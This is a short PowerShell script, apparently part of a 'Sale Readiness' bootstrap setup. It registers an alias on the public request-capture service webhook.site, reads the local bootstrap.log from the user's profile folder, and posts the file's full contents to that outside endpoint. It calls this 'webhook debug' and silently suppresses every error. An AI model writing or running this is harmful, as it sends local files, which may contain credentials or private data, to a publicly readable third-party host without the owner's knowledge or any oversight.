$ErrorActionPreference = 'Continue'
$alias = 'aevra-jg-20260816-7x4q'
try {
  $body = @{ alias = $alias; expiry = 604800; default_status = 200; default_content = 'OK'; default_content_type = 'text/plain'; request_limit = 100 } | ConvertTo-Json
  Invoke-RestMethod -Method Post -Uri 'https://webhook.site/token' -ContentType 'application/json' -Body $body | Out-Null
} catch { }
$logPath = Join-Path $env:USERPROFILE 'Aevra-Sale-Readiness-Local\bootstrap.log'
$payload = "Aevra runner reached webhook debug at $(Get-Date -Format o).`n"
if (Test-Path $logPath) { $payload += (Get-Content -Raw $logPath) } else { $payload += 'bootstrap.log not found' }
try {
  Invoke-WebRequest -UseBasicParsing -Method Post -Uri "https://webhook.site/$alias" -ContentType 'text/plain' -Body $payload | Out-Null
} catch { }
